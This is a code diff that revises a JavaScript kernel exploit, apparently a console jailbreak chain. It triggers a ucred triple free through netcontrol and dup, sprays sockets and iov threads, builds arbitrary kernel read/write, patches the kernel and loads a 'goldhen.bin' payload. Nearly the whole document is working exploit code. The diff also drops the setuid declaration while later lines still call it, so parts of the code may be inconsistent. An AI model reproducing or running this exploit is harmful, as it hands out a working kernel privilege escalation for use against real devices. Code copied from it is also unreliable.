@@ -8,12 +8,13 @@ include("kernel.js");
 
 //#region Variables
 var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 4;
-var IPV6_SOCK_NUM = 0x40;
-var FIND_TWINS_NUM = 0x10;
-var FIND_TRIPLET_NUM = 0x80;
-var SPRAY_IOV_NUM = 0x100;
-var SPRAY_UIO_NUM = 0x100;
+var UIO_THREAD_NUM = 1;
+var IPV6_SOCK_NUM = 0x20;
+var FIND_TWINS_NUM = 0x20;
+var FIND_TRIPLET_NUM = 0x20;
+var ATTEMPT_NUM = 0x10;
+var SPRAY_IOV_NUM = 0x200;
+var SPRAY_UIO_NUM = 0x200;
 var LEAK_KQUEUE_NUM = 0x400;
 //#endregion
 //#region Contants
@@ -55,7 +56,7 @@ var kq_fdp = undefined;
 
 var tmp = undefined;
 
-var setuid = new NativeFunction(0x17, "bigint");
+var sendmsg = new NativeFunction(0x1C, "bigint");
 var dup = new NativeFunction(0x29, "bigint");
 var netcontrol = new NativeFunction(0x63, "bigint");
 var socketpair = new NativeFunction(0x87, "bigint");
@@ -249,7 +250,7 @@ function find_twins() {
 function find_triplet(master, slave) {
     for (var i = 0; i < FIND_TRIPLET_NUM; i++) {
         for (var j = 0; j < ipv6_socks.length; j++) {
-            if (ipv6_socks[j] === master || ipv6_socks[j] === slave) {
+            if (ipv6_socks[j].eq(master) || ipv6_socks[j].eq(slave)) {
                 continue;
             }
 
@@ -263,12 +264,9 @@ function find_triplet(master, slave) {
         var marker = view(leak_rthdr0_addr).getUint32(4, true); // ip6_rthdr0.ip6r0_reserved
         var tag = marker & 0xFFFF;
         var idx = marker >>> 0x10;
-        if (tag === 0x1337) {
-            var sock = ipv6_socks[idx];
-            if (sock !== master && sock !== slave) {
-                debug(`Found triplet after ${i} iterations !!`);
-                return sock;
-            }
+        if (tag === 0x1337 && ipv6_socks[idx].neq(master) && ipv6_socks[idx].neq(slave)) {
+            debug(`Found triplet after ${i} iterations !!`);
+            return ipv6_socks[idx];
         }
     }
 
@@ -320,7 +318,7 @@ function setup() {
 
     // Create socket pair for iov spraying
     if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
-        throw new SyscallError("Unable to create iov socket pair !!");
+        throw new SyscallError("Unable to create socket pair !!");
     }
 
     iov_ss[0] = view(pair_addr).getInt32(0, true);
@@ -328,7 +326,7 @@ function setup() {
 
     // Create socket pair for uio spraying
     if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
-        throw new SyscallError("Unable to create uio socket pair !!");
+        throw new SyscallError("Unable to create socket pair !!");
     }
 
     uio_ss[0] = view(pair_addr).getInt32(0, true);
@@ -341,7 +339,7 @@ function setup() {
 
     // Set up sockets for spraying and initialize pktopts
     for (var i = 0; i < ipv6_socks.length; i++) {
-        ipv6_socks[i] = make_tcp6_sock();
+        ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
     }
 
     spawn_iov_threads();
@@ -357,6 +355,8 @@ function cleanup() {
         if (close.invoke(uaf_sock).eq(-1)) {
             throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
         }
+
+        uaf_sock = 0;
     }
 
     for (var i = 0; i < iov_ss.length; i++) {
@@ -390,6 +390,7 @@ function cleanup() {
     }
 
     free_karw_pipe();
+    
     stop_iov_threads();
     stop_uio_threads();
 
@@ -403,90 +404,113 @@ function ucred_triple_free() {
     msg_iov.iov_base = 1;
     msg_iov.iov_len = 1;
 
-    // Create dummy socket to be registered and then closed
-    var dummy_sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
-    if (dummy_sock.eq(-1)) {
-        throw new SyscallError("Unable to create socket !!");
-    }
+    for (var i = 0; i < ATTEMPT_NUM; i++) {
+        try {
+            // Create dummy socket to be registered and then closed
+            var dummy_sock = make_socket(AF_UNIX, SOCK_STREAM);
+            if (dummy_sock.eq(-1)) {
+                throw new SyscallError("Unable to create socket !!");
+            }
+        
+            debug(`dummy_sock: ${dummy_sock}`);
+        
+            // Register dummy socket
+            netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);
+        
+            // Close the dummy socket
+            if (close.invoke(dummy_sock).eq(-1)) {
+                throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
+            }
+        
+            // Allocate a new ucred
+            if (setuid.invoke(1).eq(-1)) {
+                throw new SyscallError("Unable to set uid to 1 !!");
+            }
+        
+            // Reclaim dummy_sock fd
+            uaf_sock = make_socket(AF_UNIX, SOCK_STREAM);
+            if (uaf_sock.eq(-1)) {
+                throw new SyscallError("Unable to create socket !!");
+            }
+        
+            debug(`uaf_sock: ${uaf_sock}`);
+        
+            if (uaf_sock.neq(dummy_sock)) {
+                throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
+            }
+        
+            // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
+            if (setuid.invoke(1).eq(-1)) {
+                throw new SyscallError("Unable to set uid to 1 !!");
+            }
+        
+            // Unregister dummy socket and free the file and ucred
+            netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);
+        
+            log(`Attempt to set cr_refcnt back to 1 started...`);
 
-    debug(`dummy_sock: ${dummy_sock}`);
+            debug("Signaling work to iov threads...");
 
-    // Register dummy socket
-    netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);
+            // Set cr_refcnt back to 1
+            for (var j = 0; j < 0x20; j++) {
+                // Reclaim with iov.
+                iov_worker.signal_work(COMMAND_IOV_RECVMSG);
+                if (sched_yield.invoke().eq(-1)) {
+                    throw new SyscallError("Unable to yield scheduler !!");
+                }
+            
+                // Release iov spray
+                if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+                    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+                }
 
-    // Close the dummy socket
-    if (close.invoke(dummy_sock).eq(-1)) {
-        throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
-    }
+                iov_worker.wait_for_finished();
+            
+                if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+                    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+                }
+            }
 
-    // Allocate a new ucred
-    if (setuid.invoke(1).eq(-1)) {
-        throw new SyscallError("Unable to set uid to 1 !!");
-    }
+            debug("iov threads work done !!");
+        
+            // Double free ucred.
+            // Note: Only dup works because it does not check fhold
+            var uaf_sock_dup = dup.invoke(uaf_sock);
+            if (uaf_sock_dup.eq(-1)) {
+                throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
+            }
+        
+            if (close.invoke(uaf_sock_dup).eq(-1)) {
+                throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
+            }
+        
+            log("Looking for twins...");
+        
+            // Find twins
+            find_twins();
 
-    // Reclaim dummy_sock fd
-    uaf_sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
-    if (uaf_sock.eq(-1)) {
-        throw new SyscallError("Unable to create socket !!");
-    }
+            break;
+        } catch(e) {
+            if (e.name === "SyscallError") {
+                throw e;
+            }
 
-    debug(`uaf_sock: ${uaf_sock}`);
+            log(`[${i + 1}/${ATTEMPT_NUM}] ${e}`);
+            log("Reattempt...");
 
-    if (uaf_sock.neq(dummy_sock)) {
-        throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
-    }
-
-    // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
-    if (setuid.invoke(1).eq(-1)) {
-        throw new SyscallError("Unable to set uid to 1 !!");
-    }
-
-    // Unregister dummy socket and free the file and ucred
-    netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);
-
-    log(`Attempt to set cr_refcnt back to 1 started...`);
-
-    debug("Signaling work to iov threads...");
-
-    // Set cr_refcnt back to 1
-    for (var j = 0; j < 0x20; j++) {
-        // Reclaim with iov
-        iov_worker.signal_work(COMMAND_IOV_RECVMSG);
-        if (sched_yield.invoke().eq(-1)) {
-            throw new SyscallError("Unable to yield scheduler !!");
+            if (uaf_sock !== 0) {
+                if (close.invoke(uaf_sock).eq(-1)) {
+                    throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
+                }
+            
+                uaf_sock = 0;
+            }
         }
-
-        // Release iov spray
-        if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
-            throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
-        }
-
-        iov_worker.wait_for_finished();
-
-        if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
-            throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
-        }
     }
 
-    debug("iov threads work done !!");
-
-    // Double free ucred.
-    // Note: Only dup works because it does not check f_hold
-    var uaf_sock_dup = dup.invoke(uaf_sock);
-    if (uaf_sock_dup.eq(-1)) {
-        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
+    if (i === ATTEMPT_NUM) {
+        throw new Error("Unable to ucred double free !!");
     }
-
-    if (close.invoke(uaf_sock_dup).eq(-1)) {
-        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
-    }
-
-    debug(`Set cr_refcnt back to 1 !!`);
-
-    log("Looking for twins...");
-
-    // Find twins
-    find_twins();
 
     log(`Found twins: ${twins} !!`);
 
@@ -494,9 +518,9 @@ function ucred_triple_free() {
 
     log("Ucred triple free started...");
 
-    free_rthdr(twins[1]);
-
     log(`Attempt to set cr_refcnt back to 1 started...`);
+
+    free_rthdr(twins[1]);
 
     debug("Signaling work to iov threads...");
 
@@ -537,7 +561,7 @@ function ucred_triple_free() {
         throw new Error("Unable to set cr_refcnt back to 1 !!");
     }
 
-    debug(`Set cr_refcnt back to 1 !!`);
+    log(`Set cr_refcnt back to 1 !!`);
 
     triplets[0] = twins[0];
 
@@ -575,7 +599,7 @@ function ucred_triple_free() {
 function leak_kqueue() {
     log("Leak kqueue started...");
 
-    free_rthdr(triplets[1]);
+    free_rthdr(triplets[2]);
 
     var leaked = false;
     for (var i = 0; i < LEAK_KQUEUE_NUM; i++) {
@@ -618,7 +642,7 @@ function leak_kqueue() {
         throw new SyscallError(`Unable to close fd ${kq} !!`);
     }
 
-    triplets[1] = find_triplet(triplets[0], triplets[2]);
+    triplets[2] = find_triplet(triplets[0], triplets[1]);
 
     debug(`Found triplet: ${triplets} !!`);
 
@@ -637,7 +661,7 @@ function kread_slow(addr, sz) {
     view(buf_sz_addr).setInt32(0, sz, true);
 
     if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
-        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
+        throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
     }
 
     // Fill queue
@@ -649,7 +673,7 @@ function kread_slow(addr, sz) {
     uio_iov_read.iov_len = sz;
 
     // Free one
-    free_rthdr(triplets[1]);
+    free_rthdr(triplets[2]);
 
     debug("Signaling work to uio threads...");
 
@@ -712,7 +736,7 @@ function kread_slow(addr, sz) {
     msg_iov.from_at(3).iov_len = sz;
 
     // Free second one
-    free_rthdr(triplets[2]);
+    free_rthdr(triplets[1]);
 
     debug("Signaling work to iov threads...");
 
@@ -775,7 +799,7 @@ function kread_slow(addr, sz) {
             triplets[1] = find_triplet(triplets[0], -1);
 
             leak_buf = leak_bufs[i];
-            break;
+            continue;
         }
 
         dispose(leak_bufs[i]);
@@ -811,14 +835,14 @@ function kwrite_slow(dst, src, sz) {
     view(buf_sz_addr).setInt32(0, sz, true);
 
     if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
-        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
+        throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
     }
     
     // Set iov length
     uio_iov_write.iov_len = sz;
 
     // Free one
-    free_rthdr(triplets[1]);
+    free_rthdr(triplets[2]);
 
     debug("Signaling work to uio threads...");
 
@@ -872,7 +896,7 @@ function kwrite_slow(dst, src, sz) {
     msg_iov.from_at(3).iov_len = sz;
 
     // Free second one
-    free_rthdr(triplets[2]);
+    free_rthdr(triplets[1]);
 
     debug("Signaling work to iov threads...");
 
@@ -946,29 +970,28 @@ function kread8_slow(addr) {
 }
 
 function remove_uaf_file() {
-    var fp = fget(uaf_sock);
-    debug(`uaf fp: ${fp}`);
+    var uaf_fp = fget(uaf_sock);
+    debug(`uaf_fp: ${uaf_fp}`);
 
     // Remove uaf sock
     fput(uaf_sock, 0);
+    uaf_sock = 0;
 
     var removed = 0;
     // Remove triple freed file from uaf sock
     for (var i = 0; i < 0x100; i++) {
-        var sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
+        var sock = make_socket(AF_UNIX, SOCK_STREAM);
         if (sock.eq(-1)) {
             throw new SyscallError("Unable to create socket !!");
         }
 
-        if (fget(sock).eq(fp)) {
+        if (fget(sock).eq(uaf_fp)) {
             debug(`Socket ${sock} uses uaf fp, removing...`);
             fput(sock, 0);
             removed++;
-        } else {
-            if (close.invoke(sock).eq(-1)) {
-                throw new SyscallError(`Unable to close fd ${sock} !!`);
-            }
         }
+
+        close.invoke(sock);
 
         if (removed === 3) {
             log(`Cleanup uaf fp after ${i} iterations !!`);
@@ -989,7 +1012,7 @@ function make_karw() {
     var slave_pipe_fp = kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
     debug(`slave_pipe_fp: ${slave_pipe_fp}`);
     
-    var master_pipe_f_data = kread8_slow(master_pipe_f_data);
+    var master_pipe_f_data = kread8_slow(master_pipe_fp);
     debug(`master_pipe_f_data: ${master_pipe_f_data}`);
     
     var slave_pipe_f_data = kread8_slow(slave_pipe_fp);
@@ -1064,26 +1087,29 @@ try {
     remove_uaf_file();
 
     log("Corrupted context cleanup complated !!");
-
-    // Find allproc
-    find_all_proc();
 } finally {
     cleanup();
 }
 
-// Read bin payload
-//var bin = read_file("/download0/hen.bin");
-var bin = read_file("/download0/goldhen.bin");
+// Find allproc
+find_all_proc();
 
-// Jailbreak
-jailbreak();
+// Avoid reapplying if already done 
+if (setuid.invoke(0).eq(-1)) {
+    // Read bin payload
+    //var bin = read_file("/download0/hen.bin");
+    var bin = read_file("/download0/goldhen.bin");
 
-// Kernel patches
-kernel_patches();
+    // Jailbreak
+    jailbreak();
 
-notify("Jailbreak successfull !!");
+    // Kernel patches
+    kernel_patches();
 
-// Load bin payload
-load_bin(bin);
+    notify("Jailbreak successfull !!");
+
+    // Load bin payload
+    load_bin(bin);
+}
 
 log("===END===");
